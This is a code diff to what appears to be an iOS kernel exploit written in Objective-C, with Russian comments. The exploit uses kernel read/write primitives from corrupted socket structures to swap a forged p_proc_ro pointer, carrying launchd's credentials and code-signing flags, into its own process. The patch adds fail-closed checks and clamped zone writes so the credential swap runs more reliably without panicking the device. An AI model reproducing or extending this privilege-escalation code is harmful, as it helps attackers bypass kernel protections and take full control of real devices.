@@ -45,6 +45,7 @@ extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_addre
 
 #import "exploit/kexploit_opa334.h" // darksword_*_socket_pcb() (corrupted inpcb VAs) for the zone route
 #import "exploit/kutils.h"          // proc_self() — direct own-proc VA, no allproc walk
+#import "exploit/krw_zone_write.h"  // clamped 0x20 writes — raw kwritebuf is 32-byte RMW
 #import "exploit/offsets.h"
 #import "TaskRop/pac.h"         // off_proc_ro_pr_task / off_task_map
 
@@ -4365,7 +4366,8 @@ e10fail:
     // нашими. Поверх — ТОЛЬКО p_ucred и p_csflags от launchd.
     memcpy(page, selfRo, sizeof(selfRo));
     if (mlock(page, 0x4000) != 0) {
-        kpNote(r, [NSString stringWithFormat:@"  mlock: %s — продолжаю (страница свежая, не выгрузится сразу)", strerror(errno)]);
+        [r appendFormat:@"FAIL: mlock(%s) — без wired-страницы p_proc_ro НЕ пишем\n", strerror(errno)];
+        return r;
     }
     {
         uint64_t qSelf = 0, qLd = 0;
@@ -4456,9 +4458,14 @@ e10fail:
             [r appendString:@"FAIL: наш proc НЕ heap-типа (RO-зона?!) — запись отменена до паники\n"];
             return r;
         }
+        if (!gHeapTypeKnown && (tProc < 0 || tProc == 0x18 || tProc == 0x15 || tProc == 0x0b || tProc == 0x37)) {
+            [r appendFormat:@"FAIL: proc FTE type=0x%02x — fail-closed, p_proc_ro не пишем\n", tProc & 0xff];
+            return r;
+        }
     }
     else {
-        [r appendString:@"  оракул типов недоступен — продолжаю без предфильтра (proc пишется форком → обычная зона)\n"];
+        [r appendString:@"FAIL: FTE-oracle нет — p_proc_ro НЕ пишем (fail-closed, ребут-класс)\n"];
+        return r;
     }
 
     // 4. Подмена: одна 8-байтная heap-запись в НАШ proc. Поле сырое (без
@@ -4466,7 +4473,14 @@ e10fail:
     //    дословный raw qword — сохранён выше для restore.
     kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (форж; оригинал raw=0x%016llx сохранён)",
               (unsigned long long)procRoSlot, (unsigned long long)forgeKVA, (unsigned long long)origProcRoRaw]);
-    kwritebuf(procRoSlot, &forgeKVA, sizeof(forgeKVA));
+    // Clamped qword. kwritebuf→early_kwrite64 = 32-byte RMW — бьёт соседей proc.
+    {
+        krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, forgeKVA, selfProc, 0x1000);
+        if (zv != KRW_ZONE_OK) {
+            [r appendFormat:@"FAIL: zone_write(swap)=%d — не пишем\n", (int)zv];
+            return r;
+        }
+    }
     didSwap = YES;
     rbRaw = 0;
     kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro readback", r);
@@ -4509,7 +4523,12 @@ e10fail:
     //    паника. Форж-страница wired и НЕ освобождается — restore единственное
     //    условие безопасного выхода. Пишем дословный оригинальный raw qword.
     if (didSwap) {
-        kwritebuf(procRoSlot, &origProcRoRaw, sizeof(origProcRoRaw));
+        {
+            krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, origProcRoRaw, selfProc, 0x1000);
+            if (zv != KRW_ZONE_OK) {
+                [r appendFormat:@"КРИТИЧНО: zone_write(restore)=%d — НЕ убивай app, ребут\n", (int)zv];
+            }
+        }
         rbRaw = 0;
         kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro restore readback", r);
         restored = (rbRaw == origProcRoRaw);
